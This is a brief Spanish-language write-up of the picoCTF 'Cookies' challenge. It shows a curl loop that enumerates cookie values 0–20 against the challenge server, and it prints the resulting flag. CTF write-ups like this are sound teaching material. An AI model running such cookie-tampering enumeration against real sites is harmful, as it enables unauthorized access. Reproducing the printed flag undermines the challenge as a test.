## Objetivo
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)
## Pistas
Sin pistas

## Solución
```
Ingresamos al sitio:
http://mercury.picoctf.net:54219/

-Probamos ingresar algo al campo de texto
-Nos dice que no es valida
-Con la extension de editor de cookies cambiamos el valor a 1
-Nos dice que es valida pero no especial
-Copiamos el link para hacer solicitud en consola
--hacemos un ciclo for que va a probar los numeros del 0 a 20 para encontrar la cookie que nos muestra la bandera.

┌──(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i"; done | grep pic 
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>
                                                                                                                               
```

picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
## Notas adicionales

## Referencias
